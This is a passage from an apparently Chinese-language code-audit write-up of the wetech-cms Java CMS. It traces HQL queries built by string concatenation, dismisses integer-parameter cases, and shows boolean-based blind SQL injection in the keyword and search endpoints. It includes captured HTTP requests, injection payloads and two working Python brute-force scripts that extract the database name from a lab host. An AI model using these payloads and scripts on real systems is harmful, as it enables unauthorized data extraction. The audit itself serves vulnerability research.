class="line"><span class="keyword">return</span> hql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个函数只是在创建查询语句的排序，继续跟踪find。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Pager&lt;Attachment&gt; <span class="title function_">findChannelPic</span><span class="params">(<span class="type">int</span> cid)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> getAttachmentSelect()+<span class="string">&quot; from Attachment a where a.topic.status=1 and&quot;</span> +</span><br><span class="line"><span class="string">&quot; a.topic.channel.id=? and a.id=a.topic.channelPicId&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.find(hql, cid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​跟踪到这个位置发现，这里传入的参数是一个整形，无法拼接SQL语句，而且还使用了预处理语句，因此该功能不存在SQL注入。</p><p>​而另一个传入false的调用则是直接使用的固定SQL语句，无法进行SQL注入。</p><h4 id="src-main-java-tech-wetech-cms-dao-ChannelDao-java-失败"><a href="#src-main-java-tech-wetech-cms-dao-ChannelDao-java-失败" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;ChannelDao.java(失败)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;ChannelDao.java(失败)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Channel&gt; <span class="title function_">listByParent</span><span class="params">(Integer pid)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;select c from Channel c left join fetch c.parent cp where cp.id=&quot;</span>+pid+<span class="string">&quot; order by c.orders&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="literal">null</span>||pid==<span class="number">0</span>) hql = <span class="string">&quot;select c from Channel c where c.parent is null order by c.orders&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.list(hql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMaxOrderByParent</span><span class="params">(Integer pid)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;select max(c.orders) from Channel c where c.parent.id=&quot;</span>+pid;</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="literal">null</span>||pid==<span class="number">0</span>) hql = <span class="string">&quot;select max(c.orders) from Channel c where c.parent is null&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="built_in">this</span>.queryObject(hql);</span><br><span class="line"><span class="keyword">if</span>(obj==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (Integer)obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这几个都是同样的原因，虽然使用了动态拼接，但是由于传入参数为整形，无法拼接SQL语句，所以直接pass。</p><h4 id="src-main-java-tech-wetech-cms-dao-TopicDao-java-成功"><a href="#src-main-java-tech-wetech-cms-dao-TopicDao-java-成功" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;TopicDao.java(成功)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;TopicDao.java(成功)</h4><h5 id="第47行-searchTopicByKeyword："><a href="#第47行-searchTopicByKeyword：" class="headerlink" title="第47行-searchTopicByKeyword："></a>第47行-searchTopicByKeyword：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Pager&lt;Topic&gt; <span class="title function_">searchTopicByKeyword</span><span class="params">(String keyword)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> getTopicSelect() + <span class="string">&quot; from Topic t where t.status=1 and t.keyword like &#x27;%&quot;</span> + keyword + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.find(hql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们跟踪一下find方法，看看是否有过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Pager&lt;T&gt; <span class="title function_">find</span><span class="params">(String hql, Object[] args, Map&lt;String, Object&gt; alias)</span> &#123;</span><br><span class="line">hql = initSort(hql);</span><br><span class="line"><span class="type">String</span> <span class="variable">cq</span> <span class="operator">=</span> getCountHql(hql,<span class="literal">true</span>);</span><br><span class="line"><span class="type">Query</span> <span class="variable">cquery</span> <span class="operator">=</span> getSession().createQuery(cq);</span><br><span class="line"><span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> getSession().createQuery(hql);</span><br><span class="line"><span class="comment">//设置别名参数</span></span><br><span class="line">setAliasParameter(query, alias);</span><br><span class="line">setAliasParameter(cquery, alias);</span><br><span class="line"><span class="comment">//设置参数</span></span><br><span class="line">setParameter(query, args);</span><br><span class="line">setParameter(cquery, args);</span><br><span class="line">Pager&lt;T&gt; pages = <span class="keyword">new</span> <span class="title class_">Pager</span>&lt;T&gt;();</span><br><span class="line">setPagers(query,pages);</span><br><span class="line">List&lt;T&gt; datas = query.list();</span><br><span class="line">pages.setDatas(datas);</span><br><span class="line"><span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> (Long)cquery.uniqueResult();</span><br><span class="line">pages.setTotal(total);</span><br><span class="line"><span class="keyword">return</span> pages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​最后在这里执行了查询，中间并未发现过滤。那么我们回过头向上追溯。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/keyword/&#123;con&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">keyword</span><span class="params">(<span class="meta">@PathVariable</span> String con, Model model)</span> &#123;</span><br><span class="line">model.addAttribute(<span class="string">&quot;kws&quot;</span>, keywordService.getMaxTimesKeyword(<span class="number">9</span>));</span><br><span class="line">SystemContext.setOrder(<span class="string">&quot;desc&quot;</span>);</span><br><span class="line">SystemContext.setSort(<span class="string">&quot;t.publishDate&quot;</span>);</span><br><span class="line">Pager&lt;Topic&gt; topics = topicService.searchTopicByKeyword(con);</span><br><span class="line">focus(topics, con);</span><br><span class="line">model.addAttribute(<span class="string">&quot;datas&quot;</span>, topics);</span><br><span class="line">model.addAttribute(<span class="string">&quot;con&quot;</span>, con);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index/keyword&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​通过路由我们定位到标签检索功能，并获得如下数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/keyword/1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.24.95.182:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.24.95.182:8888/index</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>collapase-nav=collapse-nav1; JSESSIONID=561775642554B23D11BFD032DEE33BB4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or keyword like (case when ascii(substr(database(),1,1))=1 then &#x27;</span>a<span class="string">&#x27; else &#x27;&#x27; end) and keyword like &#x27;</span></span><br></pre></td></tr></table></figure><p>​于是我们有如下python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.21.55.165:8888/keyword/1&quot;</span></span><br><span class="line">url1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),1,1))=10 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前十个字符串的10位false包</span></span><br><span class="line">url2=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),1,1))=100 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前十个字符串的100位false包</span></span><br><span class="line">url1_1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),10,1))=10 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前一百个字符串的10位false包</span></span><br><span class="line">url2_1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),10,1))=100 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前一百个字符串的100位false包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    req1 = requests.get(url1)<span class="comment">#获取前十个字符串的100位false包</span></span><br><span class="line">    req2 = requests.get(url2)<span class="comment">#获取前十个字符串的100位false包</span></span><br><span class="line">    req1_1 = requests.get(url1_1)<span class="comment">#获取前一百个字符串的10位false包</span></span><br><span class="line">    req2_1 = requests.get(url2_1)<span class="comment">#获取前一百个字符串的100位false包</span></span><br><span class="line">    r_len1 = <span class="built_in">len</span>(req1.text)</span><br><span class="line">    r_len2 = <span class="built_in">len</span>(req2.text)</span><br><span class="line">    r_len1_1 = <span class="built_in">len</span>(req1_1.text)</span><br><span class="line">    r_len2_1 = <span class="built_in">len</span>(req2_1.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            payload=<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),&#123;i&#125;,1))=&#123;k&#125; then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span>.<span class="built_in">format</span>(i=i,k=k)<span class="comment">#SQL注入payload</span></span><br><span class="line">            th_url = url + payload</span><br><span class="line">            second = requests.get(th_url)</span><br><span class="line">            s_len = <span class="built_in">len</span>(second.text)</span><br><span class="line">            <span class="keyword">if</span> k &lt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len1_1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len2:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len2_1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    req()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>​成功获取库名：</p><p><img src="/img/wetech-cms/image-20241127134337976-1732686251093-2-1732721872717-1-1732721891177-9-1732797677430-1.png" alt="image-20241127134337976"></p><h5 id="第53行-searchTopic："><a href="#第53行-searchTopic：" class="headerlink" title="第53行-searchTopic："></a>第53行-searchTopic：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Pager&lt;Topic&gt; <span class="title function_">searchTopic</span><span class="params">(String con)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> getTopicSelect() + <span class="string">&quot; from Topic t where t.status=1 and &quot;</span> + <span class="string">&quot;(title like &#x27;%&quot;</span> + con</span><br><span class="line">+ <span class="string">&quot;%&#x27; or content like &#x27;%&quot;</span> + con + <span class="string">&quot;%&#x27; or summary like &#x27;%&quot;</span> + con + <span class="string">&quot;%&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.find(hql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们先追溯find函数，看看有没有过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Pager&lt;T&gt; <span class="title function_">find</span><span class="params">(String hql, Object[] args, Map&lt;String, Object&gt; alias)</span> &#123;</span><br><span class="line">hql = initSort(hql);</span><br><span class="line"><span class="type">String</span> <span class="variable">cq</span> <span class="operator">=</span> getCountHql(hql,<span class="literal">true</span>);</span><br><span class="line"><span class="type">Query</span> <span class="variable">cquery</span> <span class="operator">=</span> getSession().createQuery(cq);</span><br><span class="line"><span class="type">Query</span> <span class="variable">query</span> <span class="operator">=</span> getSession().createQuery(hql);</span><br><span class="line"><span class="comment">//设置别名参数</span></span><br><span class="line">setAliasParameter(query, alias);</span><br><span class="line">setAliasParameter(cquery, alias);</span><br><span class="line"><span class="comment">//设置参数</span></span><br><span class="line">setParameter(query, args);</span><br><span class="line">setParameter(cquery, args);</span><br><span class="line">Pager&lt;T&gt; pages = <span class="keyword">new</span> <span class="title class_">Pager</span>&lt;T&gt;();</span><br><span class="line">setPagers(query,pages);</span><br><span class="line">List&lt;T&gt; datas = query.list();</span><br><span class="line">pages.setDatas(datas);</span><br><span class="line"><span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> (Long)cquery.uniqueResult();</span><br><span class="line">pages.setTotal(total);</span><br><span class="line"><span class="keyword">return</span> pages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​同样的地方，没有任何的过滤，那么我们直接向上追溯。</p><p>​这里我发现有两个地方调用这个方法</p><p>​分别是<strong>IndexController.java</strong>中的</p><p>​42行-search:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/search&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Topic&gt; <span class="title function_">search</span><span class="params">(String con)</span> &#123;</span><br><span class="line">SystemContext.setOrder(<span class="string">&quot;asc&quot;</span>);</span><br><span class="line">SystemContext.setSort(<span class="string">&quot;c.orders&quot;</span>);</span><br><span class="line">SystemContext.setOrder(<span class="string">&quot;desc&quot;</span>);</span><br><span class="line">SystemContext.setSort(<span class="string">&quot;t.publishDate&quot;</span>);</span><br><span class="line">Pager&lt;Topic&gt; topics = topicService.searchTopic(con);</span><br><span class="line"><span class="comment">// 将关键字着色</span></span><br><span class="line">focus(topics, con);</span><br><span class="line"><span class="keyword">return</span> topics.getDatas();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​54行-search:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/search/&#123;con&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">search</span><span class="params">(<span class="meta">@PathVariable</span> String con,Model model)</span> &#123;</span><br><span class="line">SystemContext.setOrder(<span class="string">&quot;asc&quot;</span>);</span><br><span class="line">SystemContext.setSort(<span class="string">&quot;c.orders&quot;</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;cs&quot;</span>, channelService.listChannelByType(ChannelType.NAV_CHANNEL));</span><br><span class="line">SystemContext.setOrder(<span class="string">&quot;desc&quot;</span>);</span><br><span class="line">SystemContext.setSort(<span class="string">&quot;t.publishDate&quot;</span>);</span><br><span class="line">Pager&lt;Topic&gt; topics = topicService.searchTopic(con);</span><br><span class="line">focus(topics,con);</span><br><span class="line">model.addAttribute(<span class="string">&quot;datas&quot;</span>, topics);</span><br><span class="line">model.addAttribute(<span class="string">&quot;con&quot;</span>, con);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index/search&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​分析代码我们可知，这里仅仅只是对查询语句进行了排序。我们先看第一个</p><h6 id="42行-search"><a href="#42行-search" class="headerlink" title="42行-search:"></a>42行-search:</h6><p>​根据路由我们定位到前端搜索功能，搜索后抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.55.165:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/?</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5EA494FF429C210478C61A1E2BA26079</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">con</span><span class="operator">=</span><span class="number">123</span></span></span><br></pre></td></tr></table></figure><p>​输出单引号后发现报错，尝试构造SQL语句，得到payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; and content like (case when ascii(substr(database(),1,1))=1 then &#x27;&#x27; else &#x27;</span><span class="operator">%</span><span class="string">&#x27; end) or content like &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>​根据该payload，我们有如下python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">true_of_payload = &#123;</span><br><span class="line">    <span class="string">&quot;con&quot;</span> : <span class="string">&quot;1%&#x27; and content like (case when ascii(substr(database(),1,1))=1 then &#x27;&#x27; else &#x27;%&#x27; end) or content like &#x27;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://172.21.55.165:8888/search&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    r = requests.post(url,params=true_of_payload)</span><br><span class="line">    true_len = <span class="built_in">len</span>(r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">127</span>):</span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&quot;con&quot;</span> : <span class="string">&quot;1%&#x27; and content like (case when ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; then &#x27;&#x27; else &#x27;%&#x27; end) or content like &#x27;1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,params=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text) != true_len:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    req()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​成功获取库名：</p><p><img src="/img/wetech-cms/image-20241127145422588-1732721891176-6-1732797677431-3.png" alt="image-20241127145422588"></p><h6 id="54行-search"><a href="#54行-search" class="headerlink" title="54行-search:"></a>54行-search:</h6><p>​我们抓包获取如下的数据包:</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search/1123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.55.165:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/?</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5EA494FF429C210478C61A1E2BA26079</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">con</span><span class="operator">=</span><span class="number">123</span></span></span><br></pre></td></tr></table></figure><p>​尝试输入单引号，发现报错，尝试构造payload，得到如下payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or keyword like (case when ascii(substr(database(),1,1))=1 then &#x27;</span>a<span class="string">&#x27; else &#x27;&#x27; end) and keyword like 